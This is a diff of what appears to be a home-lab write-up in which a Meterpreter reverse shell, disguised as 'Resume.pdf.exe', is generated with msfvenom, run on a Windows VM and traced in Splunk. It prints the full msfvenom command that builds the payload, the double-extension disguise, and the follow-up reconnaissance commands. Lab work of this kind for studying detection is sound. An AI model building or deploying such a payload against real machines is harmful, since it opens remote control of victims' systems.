@@ -23,11 +23,11 @@ Using Kali Linux as the attacker machine and a Windows 10 virtual machine as the
 
 
 
-#Malware Overview
+### Malware Overview
 The malware was a basic reverse shell payload, named Resume.pdf.exe. It was generated using msfvenom on Kali Linux, designed to simulate a social engineering attack. 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > Resume.pdf.exe
 
-Behavior
+## Malware Behavior
 - When executed on the Windows VM, the malware initiates a reverse connection to the Kali Linux attacker's handler
 - It spawns cmd.exe as its parent process
 - Once the connection is established, the attacker can interact with the victim machine using a meterpreter shell.
@@ -44,11 +44,11 @@ Behavior
 
 5. Executed reconnaissance commands:
 
-net user
+  net user
 
-net localgroup
+  net localgroup
 
-ipconfig
+  ipconfig
 
 6. Used Splunk to analyze logs and monitor process behavior and network activity.
 
